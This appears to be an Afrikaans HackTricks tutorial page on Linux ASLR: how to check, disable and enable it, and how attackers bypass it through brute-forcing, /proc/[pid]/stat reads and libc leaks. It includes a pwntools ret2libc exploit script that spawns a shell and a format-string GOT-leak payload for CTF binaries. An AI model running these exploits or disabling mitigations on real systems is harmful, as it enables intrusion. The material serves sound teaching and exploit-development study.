# ASLR

{{#include ../../../../banners/hacktricks-training.md}}

## Basiese Inligting

**Address Space Layout Randomization (ASLR)** is 'n sekuriteitstegniek wat in bedryfstelsels gebruik word om die **geheue adresse** wat deur stelsels en toepassingsprosesse gebruik word, te **randomiseer**. Deur dit te doen, maak dit dit aansienlik moeiliker vir 'n aanvaller om die ligging van spesifieke prosesse en data, soos die stapel, hoop en biblioteke, te voorspel, wat sekere tipes ontploffings, veral buffer oorgeloop, verminder.

### **Kontroleer ASLR Status**

Om die ASLR-status op 'n Linux-stelsel te **kontroleer**, kan jy die waarde uit die `/proc/sys/kernel/randomize_va_space` lêer lees. Die waarde wat in hierdie lêer gestoor is, bepaal die tipe ASLR wat toegepas word:

- **0**: Geen randomisering. Alles is staties.
- **1**: Konserwatiewe randomisering. Gedeelde biblioteke, stapel, mmap(), VDSO-bladsy is gerandomiseer.
- **2**: Volledige randomisering. Benewens elemente wat deur konserwatiewe randomisering gerandomiseer is, is geheue wat deur `brk()` bestuur word, gerandomiseer.

Jy kan die ASLR-status met die volgende opdrag kontroleer:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktiveer ASLR**

Om ASLR te **deaktiveer**, stel jy die waarde van `/proc/sys/kernel/randomize_va_space` op **0**. Dit is oor die algemeen nie aanbeveel om ASLR te deaktiveer buite toets- of foutopsporingstoestande nie. Hier is hoe jy dit kan deaktiveer:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
U kan ook ASLR vir 'n uitvoering deaktiveer met:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivering van ASLR**

Om ASLR te **aktiveer**, kan jy 'n waarde van **2** na die `/proc/sys/kernel/randomize_va_space` lêer skryf. Dit vereis gewoonlik wortelregte. Volledige randomisering kan gedoen word met die volgende opdrag:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Volharding Oor Herlaaiings**

Veranderings gemaak met die `echo` opdragte is tydelik en sal teruggestel word by herlaai. Om die verandering volhardend te maak, moet jy die `/etc/sysctl.conf` lêer wysig en die volgende lyn byvoeg of aanpas:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Na die redigering van `/etc/sysctl.conf`, pas die veranderinge toe met:
```bash
sudo sysctl -p
```
Dit sal verseker dat jou ASLR-instellings oor herlaaiings bly.

## **Bypasses**

### 32-bit brute-forcing

PaX verdeel die prosesadresruimte in **3 groepe**:

- **Kode en data** (geïnisialiseerde en nie-geïnisialiseerde): `.text`, `.data`, en `.bss` —> **16 bits** entropie in die `delta_exec` veranderlike. Hierdie veranderlike word ewekansig geïnitialiseer met elke proses en bygevoeg tot die aanvanklike adresse.
- **Geheue** toegeken deur `mmap()` en **gedeelde biblioteke** —> **16 bits**, genoem `delta_mmap`.
- **Die stapel** —> **24 bits**, verwys as `delta_stack`. Dit gebruik egter effektief **11 bits** (van die 10de tot die 20ste byte insluitend), uitgelijnd op **16 bytes** —> Dit lei tot **524,288 moontlike werklike stapeladresse**.

Die vorige data is vir 32-bit stelsels en die verminderde finale entropie maak dit moontlik om ASLR te omseil deur die uitvoering herhaaldelik te probeer totdat die uitbuiting suksesvol voltooi word.

#### Brute-force idees:

- As jy 'n groot genoeg oorgang het om 'n **groot NOP-slee voor die shellcode** te huisves, kan jy eenvoudig adresse in die stapel brute-force totdat die vloei **oor 'n deel van die NOP-slee spring**.
- 'n Ander opsie hiervoor, in die geval die oorgang nie so groot is nie en die uitbuiting plaaslik uitgevoer kan word, is om **die NOP-slee en shellcode in 'n omgewingsveranderlike** by te voeg.
- As die uitbuiting plaaslik is, kan jy probeer om die basisadres van libc te brute-force (nuttig vir 32-bit stelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- As jy 'n afstandsbediener aanval, kan jy probeer om die **adres van die `libc` funksie `usleep` te brute-force**, met 10 (byvoorbeeld) as argument. As die **bediener op 'n stadium 10s ekstra neem om te antwoord**, het jy die adres van hierdie funksie gevind.

> [!TIP]
> In 64-bit stelsels is die entropie baie hoër en dit is nie moontlik nie.

### Plaaslike Inligting (`/proc/[pid]/stat`)

Die lêer **`/proc/[pid]/stat`** van 'n proses is altyd deur almal leesbaar en dit **bevat interessante** inligting soos:

- **startcode** & **endcode**: Adresse bo en onder met die **TEXT** van die binêre
- **startstack**: Die adres van die begin van die **stack**
- **start_data** & **end_data**: Adresse bo en onder waar die **BSS** is
- **kstkesp** & **kstkeip**: Huidige **ESP** en **EIP** adresse
- **arg_start** & **arg_end**: Adresse bo en onder waar **cli argumente** is.
- **env_start** & **env_end**: Adresse bo en onder waar **env veranderlikes** is.

Daarom, as die aanvaller op dieselfde rekenaar is as die binêre wat uitgebuit word en hierdie binêre nie die oorgang van rou argumente verwag nie, maar van 'n ander **invoer wat na die lees van hierdie lêer saamgestel kan word**. Dit is moontlik vir 'n aanvaller om **'n paar adresse uit hierdie lêer te kry en offsets daaruit vir die uitbuiting te konstrueer**.

> [!TIP]
> Vir meer inligting oor hierdie lêer, kyk na [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) en soek vir `/proc/pid/stat`

### Om 'n lek te hê

- **Die uitdaging is om 'n lek te gee**

As jy 'n lek gegee word (maklike CTF-uitdagings), kan jy offsets daaruit bereken (veronderstel byvoorbeeld dat jy die presiese libc weergawe weet wat in die stelsel wat jy uitbuit, gebruik word). Hierdie voorbeeld uitbuiting is uit die [**voorbeeld hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (kyk daardie bladsy vir meer besonderhede):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
- **ret2plt**

Deur 'n buffer overflow te misbruik, sal dit moontlik wees om 'n **ret2plt** te benut om 'n adres van 'n funksie uit die libc te eksfiltreer. Kyk:

{{#ref}}
ret2plt.md
{{#endref}}

- **Format Strings Arbitrary Read**

Net soos in ret2plt, as jy 'n arbitrêre lees via 'n formaat string kwesbaarheid het, is dit moontlik om die adres van 'n **libc funksie** uit die GOT te eksfiltreer. Die volgende [**voorbeeld is van hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
U kan meer inligting oor Format Strings arbitrêre lees vind in:

{{#ref}}
../../format-strings/
{{#endref}}

### Ret2ret & Ret2pop

Probeer om ASLR te omseil deur adresse binne die stapel te misbruik:

{{#ref}}
../../stack-overflow/ret2ret.md
{{#endref}}

{{#include ../../../../banners/hacktricks-training.md}}
